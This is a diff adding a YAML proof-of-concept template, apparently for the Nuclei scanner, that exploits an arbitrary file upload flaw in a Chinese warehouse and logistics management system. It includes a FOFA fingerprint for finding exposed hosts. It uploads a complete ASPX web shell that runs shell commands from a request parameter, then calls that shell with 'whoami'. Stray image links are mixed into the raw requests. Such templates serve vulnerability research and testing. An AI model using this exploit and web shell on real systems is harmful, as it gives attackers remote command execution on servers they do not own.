@@ -1,0 +1,107 @@
+id: poc-xyd2xsx7h8eu4kms
+info:
+  name: 仓储系统和物流管理系统Business_Upload.ashx存在任意文件上传漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/xyd2xsx7h8eu4kms'
+  tags: file-upload,2026
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: xyd2xsx7h8eu4kms
+    fofa: body="/Images/ｆｒａｍｅ/login_title.png"
+http:
+- raw:
+  - 'POST /Module_Basic/Customers/Business_Upload.ashx HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:146.0) Gecko/20100101 Firefox/146.0
+
+    Accept: */*
+
+    Content-Type: multipart/form-data; boundary=----geckoformboundary75ee300bbeeb4fd0cdb92729f0a26360
+
+    Priority: u=0
+
+    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+
+    Accept-Encoding: gzip, deflate
+
+    Content-Length: 32379
+
+
+    ------geckoformboundary75ee300bbeeb4fd0cdb92729f0a26360
+
+    Content-Disposition: form-data; name="name"
+
+
+    user_tag_template.aspx
+
+    ------geckoformboundary75ee300bbeeb4fd0cdb92729f0a26360
+
+    Content-Disposition: form-data; name="file"; filename="user_tag_template.aspx"
+
+    Content-Type: application/html
+
+
+    <%@ Page Language="Jｓｃｒｉｐｔ" validateRequest="false" %>
+
+    <%
+
+    var c=new System.Diagnostics.ProcessStartInfo("cmd");
+
+    var e=new System.Diagnostics.Process();
+
+    var out:System.IO.StreamReader,EI:System.IO.StreamReader;
+
+    c.UseShellExecute=false;
+
+    c.RedirectStandardOutput=true;
+
+    c.RedirectStandardError=true;
+
+    e.StartInfo=c;
+
+    c.Arguments="/c " + Request.Item["cmd"];
+
+    e.Start();
+
+    out=e.StandardOutput;
+
+    EI=e.StandardError;
+
+    e.Close();
+
+    Response.Write(out.ReadToEnd() + EI.ReadToEnd());
+
+    System.IO.File.Delete(Request.PhysicalPath);
+
+    Response.End();%>
+
+    ------geckoformboundary75ee300bbeeb4fd0cdb92729f0a26360--![](https://cdn.nlark.com/yuque/0/2026/png/43110909/1769350858422-25f5a031-2117-49de-9cd8-1b440e249eca.png)
+
+    上传地址'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
+- raw:
+  - 'GET /UploadImages/689070e0-ec97-41dd-91f7-d53638f9c22a.aspx?cmd=whoami HTTP/1.1
+
+    Host: {{Hostname}}
+
+    Priority: u=4
+
+    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:146.0) Gecko/20100101 Firefox/146.0
+
+    Accept-Encoding: gzip, deflate
+
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8![](https://cdn.nlark.com/yuque/0/2026/png/43110909/1769350858837-1b239fc3-193b-4f75-bb1d-677434da8207.png)'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
